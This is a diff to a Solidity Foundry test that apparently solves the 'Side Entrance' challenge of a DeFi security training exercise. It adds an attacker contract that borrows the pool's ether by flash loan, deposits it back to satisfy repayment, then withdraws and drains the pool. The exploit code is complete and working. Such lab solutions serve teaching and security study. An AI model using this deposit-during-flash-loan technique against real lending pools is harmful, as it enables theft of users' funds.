@@ -36,7 +36,11 @@ contract SideEntrance is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        FakeReceiver attackerContract = new FakeReceiver(sideEntranceLenderPool);
+        attackerContract.flashLoan(ETHER_IN_POOL);
+        attackerContract.withdraw();
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
@@ -48,4 +52,34 @@ contract SideEntrance is Test {
         assertEq(address(sideEntranceLenderPool).balance, 0);
         assertGt(attacker.balance, attackerInitialEthBalance);
     }
+}
+
+/**
+ * @title FakeReceiver
+ * @dev This contract is used to simulate the attacker's contract.
+ */
+contract FakeReceiver {
+    address public owner;
+    SideEntranceLenderPool public pool;
+
+    constructor(SideEntranceLenderPool _pool) {
+        owner = msg.sender;
+        pool = _pool;
+    }
+
+    function flashLoan(uint256 amount) external {
+        pool.flashLoan(amount);
+    }
+
+    function execute() external payable {
+        pool.deposit{value: msg.value}();
+    }
+
+    function withdraw() external {
+        pool.withdraw();
+        (bool ok,) = payable(owner).call{value: address(this).balance}("");
+        require(ok, "Withdraw failed");
+    }
+
+    receive() external payable {}
 }
